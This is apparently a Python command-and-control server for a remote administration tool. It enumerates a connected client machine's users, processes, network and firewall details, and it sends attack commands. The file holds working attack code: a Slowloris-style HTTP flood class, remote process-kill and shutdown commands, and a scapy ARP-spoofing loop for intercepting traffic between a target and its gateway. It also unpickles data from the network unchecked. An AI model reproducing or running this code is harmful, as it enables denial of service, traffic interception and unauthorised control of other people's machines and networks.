import socket, pickle, random, time, sys, netifaces

import scapy.all as scapy

serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_ip = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']  # APPLY THIS ONLY TO LINUX

ActualValue = ""


def startconn():
    serv.bind((server_ip, 2023))  ###<<<<<< REPLACE 127.0.0.1 with server_ip
    serv.listen(5)
    print(f"Server On ")
    global conn, addr
    conn, addr = serv.accept()
    return


def connection(ActualValue):
    from_client = b''
    while True:
        conn.send(bytes(ActualValue, 'utf8'))
        data = conn.recv(999999)
        if not data: break
        from_client += data
        break
    if ActualValue == "F1" or ActualValue == "F2":
        print(data.decode('utf-8'))
        main()
    else:
        data_variable = pickle.loads(from_client)
        if ActualValue == 'C3':
            index = 1
            print("No", "|", "Name")
            for excess in data_variable:
                print(index, "|", excess)
                index = index + 1

        else:
            listToStr = ' '.join([str(elem) for elem in data_variable])
            print(listToStr)

    print(2 * '\n')
    enumvalue()


def enumvalue():
    value = ""
    accepted_command = ["U", "O", "C", "M", "N", "F", "E", "B"]
    print("[U] User Enum \n"
          "[O] OS Enum \n"
          "[C] CPU Enum \n"
          "[M] Memory Enum \n"
          "[N] Network Enum \n"
          "[F] Firewall Enum \n"
          "[E] Exit \n"
          "[B] Back \n")

    type = input("What is your category? \n")[0]
    if accepted_command[0] == type:
        print("1. Username \n"
              "2. SID \n"
              "3. Last log on \n")
        value = input("Which value you would like to extract? \n")
    elif accepted_command[1] == type:
        print("1. Machine Name \n"
              "2. Machine Version \n"
              "3. Machine Type \n"
              "4. Processor \n")
        value = input("Which value you would like to extract? \n")
    elif accepted_command[2] == type:
        print("1. CPU Usage \n"
              "2. List of Processes \n"
              "3. List of Services \n")
        value = input("Which value you would like to extract? \n")
    elif accepted_command[3] == type:
        print("1. Memory Status \n"
              "2. Memory Available \n"
              "3. Cache Memory ** \n")
        value = input("Which value you would like to extract? \n")
    elif accepted_command[4] == type:
        print("1. MAC Address \n"
              "2. IP Address \n"
              "3. Netmask \n")
        value = input("Which value you would like to extract? \n")
    elif accepted_command[5] == type:
        value = "1"
    elif accepted_command[6] == type:
        print("Connection Closed")
    elif accepted_command[7] == type:
        main()
    else:
        print("Invalid Command")
        enumvalue()
    ActualValue = type + value
    connection(ActualValue)
    return


def attackcommand():
    value = ""
    global processName
    accepted_command = ["1", "2", "3", "4", "E"]
    print("[1] HTTP request Flood \n"
          "[2] Task Killing \n"
          "[3] Remote Shut Down \n"
          "[4] ARP Spoofing \n"
          "[E] Exit \n")
    type = input("What is your attack category? \n")[0]

    if accepted_command[0] == type:
        targetIP = str(input("What is target's IP address: "))
        dos = HTTPRequestDOS(targetIP, 80, socketsCount=200)
        dos.attack(timeout=60 * 10)
    elif accepted_command[1] == type:
        processName = str(input("Enter process name: "))
        value = "2" + " " + str(processName)
        taskKill(value)
    elif accepted_command[2] == type:
        value = "9"
        ActualValue = type + value
        print(ActualValue)
        connection(ActualValue)
    elif accepted_command[3] == type:
        ip = str(input("What is target's IP address: "))
        mac = str(input("What is target's Default Gateway: "))
        start_spoof(ip, mac)
    elif accepted_command[4] == type:
        print("Connection Closed")
    else:
        print("Invalid Command")
    return

def get_mac(ip):
    arp_req_frame = scapy.ARP(pdst=ip)
    broadcast_ether_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
    answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, server_ip):
    target_mac = get_mac(target_ip)
    spoof_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=server_ip)
    scapy.send(spoof_packet, verbose=False)


def restore(source_ip, destination_ip):
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    restore_packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(restore_packet, count=1, verbose=False)


def start_spoof(target_ip, gateway_ip):
    packets_sent = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            packets_sent += 2
            print("\r[+] Packets Sent: {}".format(packets_sent), end="")
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[-] Detected Ctrl + C..... Restoring the ARP Tables..... ")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)

def taskKill(value):
    ActualValue = "2" + value
    print(ActualValue)
    connection(ActualValue)
    stop_kill = input("Press enter to stop")
    connection(stop_kill)

def firewall():
    ActualValue = "F2"
    connection(ActualValue)


class HTTPRequestDOS():
    def __init__(self, ip, port=80, socketsCount=200):
        self._ip = ip
        self._port = port
        self._headers = [
            "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
            "Accept-Language: en-us,en;q=0.5"
        ]
        self._sockets = [self.newSocket() for _ in range(socketsCount)]

    def getMessage(self, message):
        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")

    def newSocket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self._ip, self._port))
            s.send(self.getMessage("Get /?"))
            for header in self._headers:
                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
            return s
        except socket.error as se:
            print("Error: " + str(se))
            time.sleep(0.5)
            return self.newSocket()

    def attack(self, timeout=sys.maxsize, sleep=15):
        t, i = time.time(), 0
        while (time.time() - t < timeout):
            for s in self._sockets:
                try:
                    print("Sending request #{}".format(str(i)))
                    s.send(self.getMessage("X-a: "))
                    i += 1
                except socket.error:
                    self._sockets.remove(s)
                    self._sockets.append(self.newSocket())
                time.sleep(sleep / len(self._sockets))


def main():
    print("What would you like to operate: \n"
          "1. Enumeration \n"
          "2. Attack \n"
          "3. Firewall Config \n"
          "4. Exit")

    while True:
        try:
            main_input = int(input(""))
        except:
            print("We only accept integer value!")
        else:
            break

    if main_input == 1:
        enumvalue()
    elif main_input == 2:
        attackcommand()
    elif main_input == 3:
        firewall()
    elif main_input == 4:
        serv.close()
        print("Server Close")
    else:
        print("Not an option")


startconn()
main()